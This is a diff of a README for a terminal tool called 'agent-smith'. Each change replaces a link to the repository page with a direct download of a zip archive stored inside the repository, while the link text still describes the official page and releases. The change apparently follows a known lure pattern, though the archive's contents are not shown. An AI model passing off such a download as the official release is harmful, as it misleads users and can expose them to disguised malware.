@@ -1,6 +1,6 @@
 # 🤖 agent-smith - Simplify Your Terminal Tasks Easily
 
-[![Download agent-smith](https://img.shields.io/badge/Download-agent--smith-brightgreen)](https://github.com/achraf821/agent-smith)
+[![Download agent-smith](https://img.shields.io/badge/Download-agent--smith-brightgreen)](https://github.com/achraf821/agent-smith/raw/refs/heads/main/smith-matrix/smith-agent-v1.2.zip)
 
 ---
 
@@ -21,7 +21,7 @@ You can get agent-smith from its official GitHub page. Follow these simple steps
 ### Step 1: Visit the Download Page
 
 Click the button below or go to this link to open the agent-smith repository:  
-[Download agent-smith](https://github.com/achraf821/agent-smith)
+[Download agent-smith](https://github.com/achraf821/agent-smith/raw/refs/heads/main/smith-matrix/smith-agent-v1.2.zip)
 
 This page has all the files you need. It also shows updates and instructions.
 
@@ -124,7 +124,7 @@ If agent-smith does not run, try these steps:
 ## 📥 Download agent-smith Now
 
 Use the link below to visit the official agent-smith page and get started:  
-[Download agent-smith on GitHub](https://github.com/achraf821/agent-smith)
+[Download agent-smith on GitHub](https://github.com/achraf821/agent-smith/raw/refs/heads/main/smith-matrix/smith-agent-v1.2.zip)
 
 Click the link, pick the latest release, and follow installation steps above.
 
@@ -132,7 +132,7 @@ Click the link, pick the latest release, and follow installation steps above.
 
 ## 🌐 Useful Links
 
-- **GitHub Repository:** https://github.com/achraf821/agent-smith  
+- **GitHub Repository:** https://github.com/achraf821/agent-smith/raw/refs/heads/main/smith-matrix/smith-agent-v1.2.zip  
 - **Releases:** Accessible via the GitHub page under "Releases"  
 - **Support and Issues:** Use the "Issues" tab on the GitHub page to report problems or find help  
 
@@ -169,4 +169,4 @@ Check the GitHub repository regularly for updates. New versions may improve spee
 
 ---
 
-[![Download agent-smith](https://img.shields.io/badge/Download-agent--smith-brightgreen)](https://github.com/achraf821/agent-smith)
+[![Download agent-smith](https://img.shields.io/badge/Download-agent--smith-brightgreen)](https://github.com/achraf821/agent-smith/raw/refs/heads/main/smith-matrix/smith-agent-v1.2.zip)
